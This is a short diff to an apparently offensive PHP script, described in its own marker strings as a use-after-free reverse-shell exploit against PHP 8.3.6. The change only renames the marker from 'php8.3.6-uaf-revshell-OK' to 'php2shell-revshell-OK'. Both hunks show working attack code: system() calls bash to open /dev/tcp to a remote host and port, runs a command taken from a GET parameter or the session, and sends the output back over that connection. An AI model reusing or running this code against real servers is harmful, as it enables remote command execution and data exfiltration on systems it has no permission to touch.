@@ -47,7 +47,7 @@ if (isset($_GET['pl']) && $GLOBALS['uaf_started'] === 'ACTIVE'
         $cmd = (string)($_SESSION['pl'] ?? ($_GET['cmd'] ?? 'id'));
         system('bash -c ' . escapeshellarg(
             'exec 3<>/dev/tcp/' . $rhost . '/' . $port .
-            '; { ' . $cmd . '; echo php8.3.6-uaf-revshell-OK; } >&3; exec 3>&-'));
+            '; { ' . $cmd . '; echo php2shell-revshell-OK; } >&3; exec 3>&-'));
     }
     echo "OK\n";
     exit;
@@ -95,7 +95,7 @@ if (isset($_GET['pl'])) {
             $cmd = (string)($_SESSION['pl'] ?? 'id');
             system('bash -c ' . escapeshellarg(
                 'exec 3<>/dev/tcp/' . $rhost . '/' . $port .
-                '; { ' . $cmd . '; echo php8.3.6-uaf-revshell-OK; } >&3; exec 3>&-'));
+                '; { ' . $cmd . '; echo php2shell-revshell-OK; } >&3; exec 3>&-'));
         }
     }
     echo 'PLRUN FROZEN=', $frozen ? 1 : 0, ' INFLIGHT=', $inp ? 1 : 0,
